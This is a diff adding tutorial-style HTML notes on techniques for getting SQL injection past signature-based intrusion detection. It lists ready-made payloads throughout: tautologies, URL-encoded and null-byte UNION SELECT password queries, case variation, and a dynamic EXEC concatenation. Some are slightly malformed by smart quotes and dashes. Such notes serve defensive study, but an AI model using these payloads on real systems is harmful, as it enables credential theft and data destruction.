@@ -57,3 +57,62 @@ hexadecimal and decimal values into characters that can easily pass through SQL 
 <h2>Evasion Technique: Hex Encoding</h2>
 <p>The string 'SELECT' can be represented by the hexadecimal number 0x73656c656374 which will most likely not be detected by a signature protection system</p>
 <p>DROP TABLE CreditCard = 0x44524f50205461626c652043726564697443617264</p>
+
+<h2>Evasion Technique: Sophisticated Matches</h2>
+<p>Signature matches usually succeed in catching the most common classical matches, such as "OR 1=1". These signatures are built using regular expressions, hence they try to catch as many possible variations 
+of classical matches "OR 1=1" as possible. However, there are some sophisticated matches that an attacker can use to bypass the signature. These sophisticated matches are equivalent to classical matches but 
+with a slight change. An attacker might use an "OR 1=1" attack that employs a string such as "OR 'john'='john'". If this doesn't work, the attacker tricks the system by adding 'N' to the second string, such as 
+"OR 'john' =N'john'". This method is very useful in signature evasion, especially for evading advanced systems.</p>
+<p><ol>
+  <ul>OR 'john'='john'</ul>
+  <ul>' OR 'microsoft' = 'micro'+'soft'</ul>
+  <ul>' OR 'movies' = N'movies'</ul>
+  <ul>' OR 'software' like 'soft%'</ul>
+  <ul>' OR 7 > 1</ul>
+  <ul>' OR 'best' > 'b'</ul>
+  <ul>' OR 'whatever' IN ('whatever')</ul>
+  <ul>' OR 5 BETWEEN 1 AND 7</ul>
+</ol></p>
+
+<h2>Evasion Technique: URL Encoding</h2>
+<p>Normal query: ' UNION SELECT Password FROM Users_Data WHERE name='Admin'--</p>
+<p>URL Encoded: %27%20UNION%20SELECT%20Password%20FROM%20Users_Data%20WHERE%20name%3D%27Admin%27%E2%80%94</p>
+
+<h2>Evasion Technique: Null Byte</h2>
+<p>Attackers use a null byte (%00) character prior to a string to bypass the detection mechanism. Web applications use high-level languages such as PHP, ASP and so on along with C/C++ functions. However, 
+in C/C++, Null characters are used to terminate strings. </p>
+<p><ol>
+  <ul>' UNION SELECT Password FROM Users WHERE UserName='admin'--</ul>
+  <ul>%00' UNION SELECT Password FROM Users WHERE UserName='admin'--</ul>
+</ol></p>
+<p>Using Null byte character, an attacker can succesfully bypass an IDS and obtain the password of an admin account.</p>
+
+<h2>Evasion Technique: Case Variation</h2>
+<p><ol>
+  <ul>union select user_id, password</ul>
+  <ul>UNION SELECT USER_ID, PASSWORD</ul>
+  <ul>UnIoN sELeCt UsEr_iD, PaSSwOrD </ul>
+</ol></p>
+
+<h2>Evasion Technique: Declare Variables</h2>
+<p>UNION Select Password</p>
+<p>; declare @sqlvar nvarchar(70); set @sqlvar=(N'UNI' + N'ON' + N' SELECT'+ N'Password'); EXEC(@sqlvar</p>
+
+<h2>Evasion Technique: IP Fragmentation</h2>
+<p><ol>
+  <ul>Pause when sending parts of an attack in the hope that the IDS will time-out before the target computer does</ul>
+  <ul>Send the packets in reverse order</ul>
+  <ul>Send the packets in proper order, except for the first fragment, which is sent last</ul>
+  <ul>Send the packets in proper order, except for the last fragment, which is sent first</ul>
+  <ul>Send packets out of order or randomly</ul>
+</ol></p>
+
+<h2>Evasion Technique: Variation</h2>
+<p>Variation is an evasion technique whereby the attacker can easily evade any comparison statement. The attacker does this by placing characters such as "' or '1'='1'" in any basic injection statement 
+such as "or 1=1" or with other accepted SQL comments. The SQL interprets this as a comparison between two strings or characters instead of two numeric values. The following queries will return identical result sets:</p>
+<p><ol>
+  <ul>SELECT * FROM accounts WHERE userName = 'Bob' OR 1=1 –-</ul>
+  <ul>SELECT * FROM accounts WHERE userName = 'Bob' OR 2=2 –-</ul>
+  <ul>SELECT * FROM accounts WHERE userName = 'Bob' OR 1+1=2 –-</ul>
+  <ul>SELECT * FROM accounts WHERE userName = 'Bob' OR ”evade”=”ev”+”ade</ul>
+</ol></p>
